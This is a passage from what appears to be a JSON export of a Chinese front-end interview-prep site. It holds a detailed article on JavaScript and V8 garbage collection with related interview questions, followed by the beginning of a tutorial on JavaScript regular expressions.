`test`，它引用了对象 `{name: 'isboyjc'}`，接着我们把这个变量重新赋值了一个数组对象，也就变成了该变量引用了一个数组，那么之前的对象引用关系就没有了，如下图\n\n![](https://static.ecool.fun//article/a4ecfeb6-6501-44be-b0d7-79a542c58b85.awebp)\n\n没有了引用关系，也就是无用的对象，这个时候假如任由它搁置，一个两个还好，多了的话内存也会受不了，所以就需要被清理（回收）\n\n用官方一点的话说，程序的运行需要内存，只要程序提出要求，操作系统或者运行时就必须提供内存，那么对于持续运行的服务进程，必须要及时释放内存，否则，内存占用越来越高，轻则影响系统性能，重则就会导致进程崩溃\n\n## 垃圾回收策略\n\n在 JavaScript 内存管理中有一个概念叫做 `可达性`，就是那些以某种方式可访问或者说可用的值，它们被保证存储在内存中，反之不可访问则需回收\n\n至于如何回收，其实就是怎样发现这些不可达的对象（垃圾）它并给予清理的问题， `JavaScript` 垃圾回收机制的原理说白了也就是定期找出那些不再用到的内存（变量），然后释放其内存\n\n你可能还会好奇为什么不是实时的找出无用内存并释放呢？其实很简单，实时开销太大了\n\n我们都可以 Get 到这之中的重点，那就是怎样找出所谓的垃圾？\n\n这个流程就涉及到了一些算法策略，有很多种方式，我们简单介绍两个最常见的\n\n-   标记清除算法\n-   引用计数算法\n\n### 标记清除算法\n\n**策略**\n\n标记清除（Mark-Sweep），目前在 `JavaScript引擎` 里这种算法是最常用的，到目前为止的大多数浏览器的 `JavaScript引擎` 都在采用标记清除算法，只是各大浏览器厂商还对此算法进行了优化加工，且不同浏览器的 `JavaScript引擎` 在运行垃圾回收的频率上有所差异\n\n就像它的名字一样，此算法分为 `标记` 和 `清除` 两个阶段，标记阶段即为所有活动对象做上标记，清除阶段则把没有标记（也就是非活动对象）销毁\n\n你可能会疑惑怎么给变量加标记？其实有很多种办法，比如当变量进入执行环境时，反转某一位（通过一个二进制字符来表示标记），又或者可以维护进入环境变量和离开环境变量这样两个列表，可以自由的把变量从一个列表转移到另一个列表，当前还有很多其他办法。其实，怎样标记对我们来说并不重要，重要的是其策略\n\n引擎在执行 GC（使用标记清除算法）时，需要从出发点去遍历内存中所有的对象去打标记，而这个出发点有很多，我们称之为一组 `根` 对象，而所谓的根对象，其实在浏览器环境中包括又不止于 `全局Window对象`、`文档DOM树` 等\n\n整个标记清除算法大致过程就像下面这样\n\n-   垃圾收集器在运行时会给内存中的所有变量都加上一个标记，假设内存中所有对象都是垃圾，全标记为0\n-   然后从各个根对象开始遍历，把不是垃圾的节点改成1\n-   清理所有标记为0的垃圾，销毁并回收它们所占用的内存空间\n-   最后，把所有内存中对象标记修改为0，等待下一轮垃圾回收\n\n**优点**\n\n标记清除算法的优点只有一个，那就是实现比较简单，打标记也无非打与不打两种情况，这使得一位二进制位（0和1）就可以为其标记，非常简单\n\n**缺点**\n\n标记清除算法有一个很大的缺点，就是在清除之后，剩余的对象内存位置是不变的，也会导致空闲内存空间是不连续的，出现了 `内存碎片`（如下图），并且由于剩余空闲内存不是一整块，它是由不同大小内存组成的内存列表，这就牵扯出了内存分配的问题\n\n![](https://static.ecool.fun//article/a2ef8784-474d-4b58-abea-6e6e5ea1437a.awebp)\n\n假设我们新建对象分配内存时需要大小为 `size`，由于空闲内存是间断的、不连续的，则需要对空闲内存列表进行一次单向遍历找出大于等于 `size` 的块才能为其分配（如下图）\n\n![](https://static.ecool.fun//article/e041ad53-cc9e-4478-91b3-398cbcd4a872.awebp)\n\n那如何找到合适的块呢？我们可以采取下面三种分配策略\n\n-   `First-fit`，找到大于等于 `size` 的块立即返回\n    \n-   `Best-fit`，遍历整个空闲列表，返回大于等于 `size` 的最小分块\n    \n-   `Worst-fit`，遍历整个空闲列表，找到最大的分块，然后切成两部分，一部分 `size` 大小，并将该部分返回\n    \n\n这三种策略里面 `Worst-fit` 的空间利用率看起来是最合理，但实际上切分之后会造成更多的小块，形成内存碎片，所以不推荐使用，对于 `First-fit` 和 `Best-fit` 来说，考虑到分配的速度和效率 `First-fit` 是更为明智的选择\n\n综上所述，标记清除算法或者说策略就有两个很明显的缺点\n\n-   **内存碎片化**，空闲内存块是不连续的，容易出现很多空闲内存块，还可能会出现分配所需内存过大的对象时找不到合适的块\n-   **分配速度慢**，因为即便是使用 `First-fit` 策略，其操作仍是一个 `O(n)` 的操作，最坏情况是每次都要遍历到最后，同时因为碎片化，大对象的分配效率会更慢\n\n**PS：标记清除算法的缺点补充**\n\n归根结底，标记清除算法的缺点在于清除之后剩余的对象位置不变而导致的空闲内存不连续，所以只要解决这一点，两个缺点都可以完美解决了\n\n而 **标记整理（Mark-Compact）算法** 就可以有效地解决，它的标记阶段和标记清除算法没有什么不同，只是标记结束后，标记整理算法会将活着的对象（即不需要清理的对象）向内存的一端移动，最后清理掉边界的内存（如下图）\n\n![](https://static.ecool.fun//article/16743dc4-4d63-4b5b-8df4-b94c4fa06298.awebp)\n\n### 引用计数算法\n\n**策略**\n\n引用计数（Reference Counting），这其实是早先的一种垃圾回收算法，它把 `对象是否不再需要` 简化定义为 `对象有没有其他对象引用到它`，如果没有引用指向该对象（零引用），对象将被垃圾回收机制回收，目前很少使用这种算法了，因为它的问题很多，不过我们还是需要了解一下\n\n它的策略是跟踪记录每个变量值被使用的次数\n\n-   当声明了一个变量并且将一个引用类型赋值给该变量的时候这个值的引用次数就为 1\n    \n-   如果同一个值又被赋给另一个变量，那么引用数加 1\n    \n-   如果该变量的值被其他的值覆盖了，则引用次数减 1\n    \n-   当这个值的引用次数变为 0 的时候，说明没有变量在使用，这个值没法被访问了，回收空间，垃圾回收器会在运行的时候清理掉引用次数为 0 的值占用的内存\n    \n\n如下例\n\n```js\nlet a = new Object() \t// 此对象的引用计数为 1（a引用）\nlet b = a \t\t// 此对象的引用计数是 2（a,b引用）\na = null  \t\t// 此对象的引用计数为 1（b引用）\nb = null \t \t// 此对象的引用计数为 0（无引用）\n...\t\t\t// GC 回收此对象\n```\n\n这种方式是不是很简单？确实很简单，不过在引用计数这种算法出现没多久，就遇到了一个很严重的问题——循环引用，即对象 A 有一个指针指向对象 B，而对象 B 也引用了对象 A ，如下面这个例子\n\n```js\nfunction test(){\n  let A = new Object()\n  let B = new Object()\n  \n  A.b = B\n  B.a = A\n}\n```\n\n如上所示，对象 A 和 B 通过各自的属性相互引用着，按照上文的引用计数策略，它们的引用数量都是 2，但是，在函数 `test` 执行完成之后，对象 A 和 B 是要被清理的，但使用引用计数则不会被清理，因为它们的引用数量不会变成 0，假如此函数在程序中被多次调用，那么就会造成大量的内存不会被释放\n\n我们再用标记清除的角度看一下，当函数结束后，两个对象都不在作用域中，A 和 B 都会被当作非活动对象来清除掉，相比之下，引用计数则不会释放，也就会造成大量无用内存占用，这也是后来放弃引用计数，使用标记清除的原因之一\n\n> 在 IE8 以及更早版本的 IE 中，`BOM` 和 `DOM` 对象并非是原生 `JavaScript` 对象，它是由 `C++` 实现的 `组件对象模型对象（COM，Component Object Model）`，而 `COM` 对象使用 引用计数算法来实现垃圾回收，所以即使浏览器使用的是标记清除算法，只要涉及到 `COM` 对象的循环引用，就还是无法被回收掉，就比如两个互相引用的 `DOM` 对象等等，而想要解决循环引用，需要将引用地址置为 `null` 来切断变量与之前引用值的关系，如下\n> \n> ```js\n> // COM对象\n> let ele = document.getElementById(\"xxx\")\n> let obj = new Object()\n> \n> // 造成循环引用\n> obj.ele = ele\n> ele.obj = obj\n> \n> // 切断引用关系\n> obj.ele = null\n> ele.obj = null\n> ```\n> \n> 不过在 IE9 及以后的 `BOM` 与 `DOM` 对象都改成了 `JavaScript` 对象，也就避免了上面的问题\n> \n> 此处参考 JavaScript高级程序设计 第四版 4.3.2 小节\n\n**优点**\n\n引用计数算法的优点我们对比标记清除来看就会清晰很多，首先引用计数在引用值为 0 时，也就是在变成垃圾的那一刻就会被回收，所以它可以立即回收垃圾\n\n而标记清除算法需要每隔一段时间进行一次，那在应用程序（JS脚本）运行过程中线程就必须要暂停去执行一段时间的 `GC`，另外，标记清除算法需要遍历堆里的活动以及非活动对象来清除，而引用计数则只需要在引用时计数就可以了\n\n**缺点**\n\n引用计数的缺点想必大家也都很明朗了，首先它需要一个计数器，而此计数器需要占很大的位置，因为我们也不知道被引用数量的上限，还有就是无法解决循环引用无法回收的问题，这也是最严重的\n\n## V8对GC的优化\n\n我们在上面也说过，现在大多数浏览器都是基于标记清除算法，V8 亦是，当然 V8 肯定也对其进行了一些优化加工处理，那接下来我们主要就来看 V8 中对垃圾回收机制的优化\n\n### 分代式垃圾回收\n\n试想一下，我们上面所说的垃圾清理算法在每次垃圾回收时都要检查内存中所有的对象，这样的话对于一些大、老、存活时间长的对象来说同新、小、存活时间短的对象一个频率的检查很不好，因为前者需要时间长并且不需要频繁进行清理，后者恰好相反，怎么优化这点呢？？？分代式就来了\n\n#### 新老生代\n\nV8 的垃圾回收策略主要基于分代式垃圾回收机制，V8 中将堆内存分为新生代和老生代两区域，采用不同的垃圾回收器也就是不同的策略管理垃圾回收\n\n新生代的对象为存活时间较短的对象，简单来说就是新产生的对象，通常只支持 `1～8M` 的容量，而老生代的对象为存活事件较长或常驻内存的对象，简单来说就是经历过新生代垃圾回收后还存活下来的对象，容量通常比较大\n\nV8 整个堆内存的大小就等于新生代加上老生代的内存（如下图）\n\n![](https://static.ecool.fun//article/ab218a80-f8db-4214-9b41-db025689cf57.awebp)\n\n对于新老两块内存区域的垃圾回收，V8 采用了两个垃圾回收器来管控，我们暂且将管理新生代的垃圾回收器叫做新生代垃圾回收器，同样的，我们称管理老生代的垃圾回收器叫做老生代垃圾回收器好了\n\n#### 新生代垃圾回收\n\n新生代对象是通过一个名为 `Scavenge` 的算法进行垃圾回收，在 `Scavenge算法` 的具体实现中，主要采用了一种复制式的方法即 `Cheney算法` ，我们细细道来\n\n`Cheney算法` 中将堆内存一分为二，一个是处于使用状态的空间我们暂且称之为 `使用区`，一个是处于闲置状态的空间我们称之为 `空闲区`，如下图所示\n\n![](https://static.ecool.fun//article/7354f331-e31d-4139-b0ec-e5ba8a626b78.awebp)\n\n新加入的对象都会存放到使用区，当使用区快被写满时，就需要执行一次垃圾清理操作\n\n当开始进行垃圾回收时，新生代垃圾回收器会对使用区中的活动对象做标记，标记完成之后将使用区的活动对象复制进空闲区并进行排序，随后进入垃圾清理阶段，即将非活动对象占用的空间清理掉。最后进行角色互换，把原来的使用区变成空闲区，把原来的空闲区变成使用区\n\n当一个对象经过多次复制后依然存活，它将会被认为是生命周期较长的对象，随后会被移动到老生代中，采用老生代的垃圾回收策略进行管理\n\n另外还有一种情况，如果复制一个对象到空闲区时，空闲区空间占用超过了 25%，那么这个对象会被直接晋升到老生代空间中，设置为 25% 的比例的原因是，当完成 `Scavenge` 回收后，空闲区将翻转成使用区，继续进行对象内存的分配，若占比过大，将会影响后续内存分配\n\n#### 老生代垃圾回收\n\n相比于新生代，老生代的垃圾回收就比较容易理解了，上面我们说过，对于大多数占用空间大、存活时间长的对象会被分配到老生代里，因为老生代中的对象通常比较大，如果再如新生代一般分区然后复制来复制去就会非常耗时，从而导致回收执行效率不高，所以老生代垃圾回收器来管理其垃圾回收执行，它的整个流程就采用的就是上文所说的标记清除算法了\n\n首先是标记阶段，从一组根元素开始，递归遍历这组根元素，遍历过程中能到达的元素称为活动对象，没有到达的元素就可以判断为非活动对象\n\n清除阶段老生代垃圾回收器会直接将非活动对象，也就是数据清理掉\n\n前面我们也提过，标记清除算法在清除后会产生大量不连续的内存碎片，过多的碎片会导致大对象无法分配到足够的连续内存，而 V8 中就采用了我们上文中说的标记整理算法来解决这一问题来优化空间\n\n#### 为什么需要分代式？\n\n正如小标题，为什么需要分代式？这个机制有什么优点又解决了什么问题呢？\n\n其实，它并不能说是解决了什么问题，可以说是一个优化点吧\n\n分代式机制把一些新、小、存活时间短的对象作为新生代，采用一小块内存频率较高的快速清理，而一些大、老、存活时间长的对象作为老生代，使其很少接受检查，新老生代的回收机制及频率是不同的，可以说此机制的出现很大程度提高了垃圾回收机制的效率\n\n### 并行回收(Parallel)\n\n在介绍并行之前，我们先要了解一个概念 `全停顿（Stop-The-World）`，我们都知道 `JavaScript` 是一门单线程的语言，它是运行在主线程上的，那在进行垃圾回收时就会阻塞 `JavaScript` 脚本的执行，需等待垃圾回收完毕后再恢复脚本执行，我们把这种行为叫做 `全停顿`\n\n比如一次 `GC` 需要 `60ms` ，那我们的应用逻辑就得暂停 `60ms` ，假如一次 `GC` 的时间过长，对用户来说就可能造成页面卡顿等问题\n\n既然存在执行一次 `GC` 比较耗时的情况，考虑到一个人盖房子难，那两个人、十个人...呢？切换到程序这边，那我们可不可以引入多个辅助线程来同时处理，这样是不是就会加速垃圾回收的执行速度呢？因此 V8 团队引入了并行回收机制\n\n所谓并行，也就是同时的意思，它指的是垃圾回收器在主线程上执行的过程中，开启多个辅助线程，同时执行同样的回收工作\n\n![](https://static.ecool.fun//article/5f1b8acc-fc80-4702-a15d-8896c2b3cd6c.awebp)\n\n简单来说，使用并行回收，假如本来是主线程一个人干活，它一个人需要 3 秒，现在叫上了 2 个辅助线程和主线程一块干活，那三个人一块干一个人干 1 秒就完事了，但是由于多人协同办公，所以需要加上一部分多人协同（同步开销）的时间我们算 0.5 秒好了，也就是说，采用并行策略后，本来要 3 秒的活现在 1.5 秒就可以干完了\n\n不过虽然 1.5 秒就可以干完了，时间也大大缩小了，但是这 1.5 秒内，主线程还是需要让出来的，也正是因为主线程还是需要让出来，这个过程内存是静态的，不需要考虑内存中对象的引用关系改变，只需要考虑协同，实现起来也很简单\n\n新生代对象空间就采用并行策略，在执行垃圾回收的过程中，会启动了多个线程来负责新生代中的垃圾清理操作，这些线程同时将对象空间中的数据移动到空闲区域，这个过程中由于数据地址会发生改变，所以还需要同步更新引用这些对象的指针，此即并行回收\n\n### 增量标记与懒性清理\n\n我们上面所说的并行策略虽然可以增加垃圾回收的效率，对于新生代垃圾回收器能够有很好的优化，但是其实它还是一种全停顿式的垃圾回收方式，对于老生代来说，它的内部存放的都是一些比较大的对象，对于这些大的对象 `GC` 时哪怕我们使用并行策略依然可能会消耗大量时间\n\n所以为了减少全停顿的时间，在 2011 年，V8 对老生代的标记进行了优化，从全停顿标记切换到增量标记\n\n#### 什么是增量\n\n增量就是将一次 `GC` 标记的过程，分成了很多小步，每执行完一小步就让应用逻辑执行一会儿，这样交替多次后完成一轮 `GC` 标记（如下图）\n\n![](https://static.ecool.fun//article/82bfc815-4888-4acb-b961-1f63e7ff670e.awebp)\n\n试想一下，将一次完整的 `GC` 标记分次执行，那在每一小次 `GC` 标记执行完之后如何暂停下来去执行任务程序，而后又怎么恢复呢？那假如我们在一次完整的 `GC` 标记分块暂停后，执行任务程序时内存中标记好的对象引用关系被修改了又怎么办呢？\n\n可以看出增量的实现要比并行复杂一点，V8 对这两个问题对应的解决方案分别是三色标记法与写屏障\n\n#### 三色标记法(暂停与恢复)\n\n我们知道老生代是采用标记清理算法，而上文的标记清理中我们说过，也就是在没有采用增量算法之前，单纯使用黑色和白色来标记数据就可以了，其标记流程即在执行一次完整的 `GC` 标记前，垃圾回收器会将所有的数据置为白色，然后垃圾回收器在会从一组跟对象出发，将所有能访问到的数据标记为黑色，遍历结束之后，标记为黑色的数据对象就是活动对象，剩余的白色数据对象也就是待清理的垃圾对象\n\n如果采用非黑即白的标记策略，那在垃圾回收器执行了一段增量回收后，暂停后启用主线程去执行了应用程序中的一段 `JavaScript` 代码，随后当垃圾回收器再次被启动，这时候内存中黑白色都有，我们无法得知下一步走到哪里了\n\n为了解决这个问题，V8 团队采用了一种特殊方式： `三色标记法`\n\n三色标记法即使用每个对象的两个标记位和一个标记工作表来实现标记，两个标记位编码三种颜色：白、灰、黑\n\n-   白色指的是未被标记的对象\n-   灰色指自身被标记，成员变量（该对象的引用对象）未被标记\n-   黑色指自身和成员变量皆被标记\n\n![](https://static.ecool.fun//article/fb68021f-ea26-4d69-b26e-1bbaf460960c.awebp)\n\n如上图所示，我们用最简单的表达方式来解释这一过程，最初所有的对象都是白色，意味着回收器没有标记它们，从一组根对象开始，先将这组根对象标记为灰色并推入到标记工作表中，当回收器从标记工作表中弹出对象并访问它的引用对象时，将其自身由灰色转变成黑色，并将自身的下一个引用对象转为灰色\n\n就这样一直往下走，直到没有可标记灰色的对象时，也就是无可达（无引用到）的对象了，那么剩下的所有白色对象都是无法到达的，即等待回收（如上图中的 `C、E` 将要等待回收）\n\n采用三色标记法后我们在恢复执行时就好办多了，可以直接通过当前内存中有没有灰色节点来判断整个标记是否完成，如没有灰色节点，直接进入清理阶段，如还有灰色标记，恢复时直接从灰色的节点开始继续执行就可以\n\n三色标记法的 mark 操作可以渐进执行的而不需每次都扫描整个内存空间，可以很好的配合增量回收进行暂停恢复的一些操作，从而减少 `全停顿` 的时间\n\n#### 写屏障(增量中修改引用)\n\n一次完整的 `GC` 标记分块暂停后，执行任务程序时内存中标记好的对象引用关系被修改了，增量中修改引用，可能不太好理解，我们举个例子（如图）\n\n![](https://static.ecool.fun//article/e32fe421-bf15-43d6-b3d2-56e55e117360.awebp)\n\n假如我们有 `A、B、C` 三个对象依次引用，在第一次增量分段中全部标记为黑色（活动对象），而后暂停开始执行应用程序也就是 JavaScript 脚本，在脚本中我们将对象 `B` 的指向由对象 `C` 改为了对象 `D` ，接着恢复执行下一次增量分段\n\n这时其实对象 `C` 已经无引用关系了，但是目前它是黑色（代表活动对象）此一整轮 `GC` 是不会清理 `C` 的，不过我们可以不考虑这个，因为就算此轮不清理等下一轮 `GC` 也会清理，这对我们程序运行并没有太大影响\n\n我们再看新的对象 `D` 是初始的白色，按照我们上面所说，已经没有灰色对象了，也就是全部标记完毕接下来要进行清理了，新修改的白色对象 `D` 将在次轮 `GC` 的清理阶段被回收，还有引用关系就被回收，后面我们程序里可能还会用到对象 `D` 呢，这肯定是不对的\n\n为了解决这个问题，V8 增量回收使用 `写屏障 (Write-barrier)` 机制，即一旦有黑色对象引用白色对象，该机制会强制将引用的白色对象改为灰色，从而保证下一次增量 `GC` 标记阶段可以正确标记，这个机制也被称作 `强三色不变性`\n\n那在我们上图的例子中，将对象 `B` 的指向由对象 `C` 改为对象 `D` 后，白色对象 `D` 会被强制改为灰色\n\n#### 懒性清理\n\n增量标记其实只是对活动对象和非活动对象进行标记，对于真正的清理释放内存 V8 采用的是惰性清理(Lazy Sweeping)\n\n增量标记完成后，惰性清理就开始了。当增量标记完成后，假如当前的可用内存足以让我们快速的执行代码，其实我们是没必要立即清理内存的，可以将清理过程稍微延迟一下，让 `JavaScript` 脚本代码先执行，也无需一次性清理完所有非活动对象内存，可以按需逐一进行清理直到所有的非活动对象内存都清理完毕，后面再接着执行增量标记\n\n#### 增量标记与惰性清理的优缺？\n\n增量标记与惰性清理的出现，使得主线程的停顿时间大大减少了，让用户与浏览器交互的过程变得更加流畅。但是由于每个小的增量标记之间执行了 `JavaScript` 代码，堆中的对象指针可能发生了变化，需要使用写屏障技术来记录这些引用关系的变化，所以增量标记缺点也很明显：\n\n首先是并没有减少主线程的总暂停的时间，甚至会略微增加，其次由于写屏障机制的成本，增量标记可能会降低应用程序的吞吐量（吞吐量是啥总不用说了吧）\n\n### 并发回收(Concurrent)\n\n前面我们说并行回收依然会阻塞主线程，增量标记同样有增加了总暂停时间、降低应用程序吞吐量两个缺点，那么怎么才能在不阻塞主线程的情况下执行垃圾回收并且与增量相比更高效呢？\n\n这就要说到并发回收了，它指的是主线程在执行 `JavaScript` 的过程中，辅助线程能够在后台完成执行垃圾回收的操作，辅助线程在执行垃圾回收的时候，主线程也可以自由执行而不会被挂起（如下图）\n\n![](https://static.ecool.fun//article/376bdca7-ab40-43c1-bf83-f028bf60dba0.awebp)\n\n辅助线程在执行垃圾回收的时候，主线程也可以自由执行而不会被挂起，这是并发的优点，但同样也是并发回收实现的难点，因为它需要考虑主线程在执行 `JavaScript` 时，堆中的对象引用关系随时都有可能发生变化，这时辅助线程之前做的一些标记或者正在进行的标记就会要有所改变，所以它需要额外实现一些读写锁机制来控制这一点，这里我们不再细说\n\n### 再说V8中GC优化\n\nV8 的垃圾回收策略主要基于分代式垃圾回收机制，这我们说过，关于新生代垃圾回收器，我们说使用并行回收可以很好的增加垃圾回收的效率，那老生代垃圾回收器用的哪个策略呢？我上面说了并行回收、增量标记与惰性清理、并发回收这几种回收方式来提高效率、优化体验，看着一个比一个好，那老生代垃圾回收器到底用的哪个策略？难道是并发？？内心独白：” 好像。。貌似。。并发回收效率最高 “\n\n其实，这三种方式各有优缺点，所以在老生代垃圾回收器中这几种策略都是融合使用的\n\n老生代主要使用并发标记，主线程在开始执行 `JavaScript` 时，辅助线程也同时执行标记操作（标记操作全都由辅助线程完成）\n\n标记完成之后，再执行并行清理操作（主线程在执行清理操作时，多个辅助线程也同时执行清理操作）\n\n同时，清理的任务会采用增量的方式分批在各个 `JavaScript` 任务之间执行\n\n## 最后\n\n那上面就是 V8 引擎为我们的垃圾回收所做的一些主要优化了，虽然引擎有优化，但并不是说我们就可以完全不用关心垃圾回收这块了，我们的代码中依然要主动避免一些不利于引擎做垃圾回收操作，因为不是所有无用对象内存都可以被回收的，那当不再用到的内存，没有及时回收时，我们叫它 `内存泄漏`。",
    "testPoint": "### 1. **垃圾回收的基本概念**\n   - 你能解释一下什么是垃圾回收吗？为什么 JavaScript 需要垃圾回收机制？\n   - 在 JavaScript 中，哪些类型的内存需要被垃圾回收？比如堆内存和栈内存的分配与回收有何不同？\n\n### 2. **垃圾回收算法**\n   - JavaScript 常用的垃圾回收算法是什么？请简要解释 **标记清除（Mark-and-Sweep）** 算法的原理。\n   - 你了解 **引用计数（Reference Counting）** 吗？它是如何工作的？为什么它可能导致循环引用问题？\n\n### 3. **分代回收**\n   - 什么是 **分代回收（Generational Garbage Collection）**？请解释新生代（Young Generation）和老年代（Old Generation）内存区域的划分。\n   - 在分代回收机制中，为什么会把对象划分为新生代和老年代？这对性能优化有什么帮助？\n\n### 4. **垃圾回收的触发条件与频率**\n   - 垃圾回收是如何触发的？在 V8 引擎中，垃圾回收的触发条件是什么？\n   - 新生代和老年代的回收频率和方式有何不同？这对性能有哪些影响？\n\n### 5. **性能与垃圾回收的影响**\n   - 垃圾回收会导致应用的性能下降吗？在什么情况下会出现卡顿（如 GC 暂停）？\n   - 什么是 **\"Stop the World\"** 现象？在垃圾回收过程中是如何避免或减少这种情况的？\n\n### 6. **内存泄漏和垃圾回收**\n   - 内存泄漏对垃圾回收有什么影响？哪些情况会导致内存泄漏，如全局变量、闭包、未清除的定时器等？\n   - 你能举例说明如何检测和解决内存泄漏问题吗？\n\n### 7. **垃圾回收的调试与监控**\n   - 如何在开发过程中调试和监控垃圾回收？有哪些工具（如 Chrome DevTools）可以帮助我们查看内存的使用情况？\n   - 如果你发现应用内存占用逐渐增加（可能存在内存泄漏），你会如何定位和分析问题？\n\n### 8. **JavaScript 引擎的垃圾回收优化**\n   - 你知道 JavaScript 引擎（如 V8）对垃圾回收的哪些优化吗？如增量标记（Incremental Marking）、并行清理等。\n   - 在进行大量 DOM 操作或处理大数据时，你如何优化代码以减少垃圾回收的影响？\n\n### 9. **实际应用中的垃圾回收**\n   - 在实际项目中，你遇到过垃圾回收导致的性能问题吗？请描述一个具体的场景以及你的解决方法。\n   - 对于需要频繁创建和销毁对象的应用（如动画、图表渲染等），你如何减少垃圾回收的开销？\n\n### 10. **现代垃圾回收优化策略**\n   - 你了解哪些现代垃圾回收优化策略？比如并发回收（Concurrent Collection）、并行回收（Parallel Collection）等。\n   - 在前端开发中，你认为合理的内存管理和垃圾回收策略对用户体验有多重要？为什么？",
    "exerciseKeyList": "[\"7e744ea0-1c66-4ef9-b984-bb8828d98279\",\"594f4864-1932-4020-aec6-a2ae0fb16765\"]",
    "vipLimit": 1,
    "level": 4,
    "pointOrder": 15,
    "createAt": "2024-10-01T13:27:05.000Z",
    "updateAt": "2024-12-24T09:34:00.000Z",
    "$progressExercise": "",
    "$exerciseList": [
      {
        "exerciseKey": "594f4864-1932-4020-aec6-a2ae0fb16765",
        "title": "浏览器的垃圾回收机制有哪些？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-09-25T02:38:47.000Z",
        "updateAt": "2024-07-20T11:53:54.000Z"
      },
      {
        "exerciseKey": "7e744ea0-1c66-4ef9-b984-bb8828d98279",
        "title": "JavaScript 是怎么做内存管理的？",
        "category": "QA",
        "vipLimit": 1,
        "createAt": "2024-08-13T08:30:22.000Z",
        "updateAt": "2024-09-19T01:20:52.000Z"
      }
    ]
  },
  "25": {
    "id": 25,
    "tagId": 10,
    "title": "正则表达式",
    "explanation": "# 前言\n\n> 正则表达式使用单个\\[字符串\\]来描述、匹配一系列匹配某个\\[句法规则\\]的字符串，通常被用来检索、替换那些符合某个模式（规则）的文本。\n\n# 创建\n\n## 1.构造函数创建\n\n> new RegExp('正则表达式','修饰符')\n\n```js\nvar reg = new RegExp('hello','igm');\n```\n\n## 2.直接直面量创建\n\n> /正则表达式/修饰符\n\n```js\nvar reg = /hello/igm;\n```\n\n# 字符分类\n\n## 1.普通字符\n\n> 字母、数字、下划线、汉字、没有特殊含义的符号（,;!@等）\n> \n> 实际上不是特殊字符的字符都是普通字符\n\n## 2.特殊字符\n\n> \\\\：将特殊字符转义成普通字符\n\n## 3.模式修饰符\n\n> i：ignoreCase，匹配时忽视大小写\n> \n> m：multiline，多行匹配\n> \n> g：global，全局匹配\n> \n> 字面量创建正则时，模式修饰符写在一对反斜线后\n\n# 实例方法\n\n## 1.exec()\n\n> 用来匹配字符串中符合正则表达式的字符串\n> \n> 如果匹配到，返回值是一个result数组:\n> \n> \\[匹配的内容，index: 在str中匹配的起始位置，input: 参数字符串，groups: undefined\\]\n> \n> 否则返回null\n\n```js\nvar str = 'Hello world javascript hello';\nvar reg = new RegExp('hello','igm');\nvar res = reg.exec(str);\nconsole.log(res);\n\n输出结果为：\n[\n    'Hello',\n    index: 0,\n    input: 'hello world javascript hello',\n    groups: undefined\n]\n```\n\n## 2.test()\n\n> 用来测试待检测的字符串中是否有可以匹配到正则表达式的字符串\n> \n> 如果有返回true，否则返回false\n\n```js\nvar reg = /hello/;\nvar str = 'hello world';\nconsole.log(reg.test(str));  //true\n```\n\n## 3.toSting() toLocaleString()\n\n> 把正则表达式的内容转化成**字面量形式字符串**/有本地特色的字符串\n\n```js\nvar reg = /hello/;\nvar str = 'hello world';\nconsole.log(reg.toString(),typeof reg.toString());   // /hello/ string\nconsole.log(reg.toLocaleString(),typeof reg.toLocaleString());   // /hello/ string\n```\n\n## 4.valueOf()\n\n> 返回正则表达式本身\n\n```js\nvar reg = /hello/;\nvar str = 'hello world';\nconsole.log(reg,typeof reg);   // /hello/ object\nconsole.log(reg.valueOf(),typeof reg.valueOf());  // /hello/ object\n```\n\n# 正则表达式实例属性\n\n## 1.lastIndex\n\n> 当没设置全局匹配时，该属性值**始终为0**\n> \n> 设置了全局匹配时，每执行一次exec/test来匹配，lastIndex就会移向匹配到的字符串的下一个位置，当指向的位置后没有可以再次匹配的字符串时，下一次执行exec返回**null**，test执行返回**false**，然后lastIndex**归零**，从字符串的开头重新匹配一轮\n> \n> 可以理解成，每次正则**查找的起点**就是lastIndex\n\n```js\nvar str = 'hello hello hello';\nvar reg1 = /hello/;\nvar reg2 = /hello/g;\nconsole.log(reg1.lastIndex);  // 0\nconsole.log(reg1.exec(str));  // 返回第一个hello\nconsole.log(reg1.lastIndex);  // 0\n\nconsole.log(reg2.lastIndex);  // 0\nconsole.log(reg2.exec(str));  // 返回第一个hello\nconsole.log(reg2.lastIndex);  // 5\n\nconsole.log(reg2.lastIndex);  // 5\nconsole.log(reg2.exec(str));  // 返回第二个hello\nconsole.log(reg2.lastIndex);  // 11\n\nconsole.log(reg2.lastIndex);  // 11\nconsole.log(reg2.exec(str));  // 返回第三个hello\nconsole.log(reg2.lastIndex);  // 17\n\nconsole.log(reg2.exec(str));  //返回 null\n\nconsole.log(reg2.lastIndex);  // 0\nconsole.log(reg2.exec(str));  // 返回第一个hello\n```\n\n## 2.ignoreCase、global、multiline\n\n> 判断正则表达式中是否有**忽略大小写**、**全局匹配**、**多行匹配**三个模式修饰符\n\n```js\nvar pattern = /hello/igm;\nconsole.log(pattern.ignoreCase); //true\nconsole.log(pattern.global); //true\nconsole.log(pattern.multiline); //true\n```\n\n## 3.source\n\n> 返回**字面量形式**的正则表达式（**类似于toString**）\n\n```js\nvar pattern = /hello/igm; \nconsole.log(pattern.source,typeof pattern.source);  //hello string\n```\n\n# 正则表达式语法\n\n## 1.直接量字符\n\n> 正则表达式中的所有字母和数字都是按照字面含义进行匹配的，Javascript正则表达式语法也支持非字母的字符匹配，这些字符需要通过反斜线\\\\作为前缀进行转义。\n\n| 字符 | 匹配 |\n| --- | --- |\n| 字母和数字字符 | 自身 |\n| \\\\o | Null字符 |\n| \\\\t | 制表符 |\n| \\\\n | 换行符 |\n| \\\\v | 垂直制表符 |\n| \\\\f | 换页符 |\n| \\\\r | 回车符 |\n\n```js\nvar reg = /\\n/;\nconsole.log(reg.test('hello \\n world'));  //true\nconsole.log('hello \\n world'); \n结果为：\nhello\n world\n```\n\n## 2.字符集合\n\n> 字符集合，也叫字符组。匹配集合中的任意一个字符。 可以使用连字符‘-’指定一个范围。\n> \n> \\[^xyz\\] 反义或补充字符集，也叫反义字符组。匹配任意不在括号内的字符。也可以通过使用连字符 '-' 指定一个范围内的字符。\n> \n> ##### 注意：^写在\\[\\]里面是反义字符组\n\n```js\nvar reg = /[abc]/; //匹配括号中任意一个字母\nconsole.log(reg.test('aaa hello world1'));  //true\n\nvar reg = /[0-9]/; //匹配任意一个数字\nconsole.log(reg.test('aaa hello world1')); //true\n\nvar reg = /[^xyz]/; //包含xyz返回false 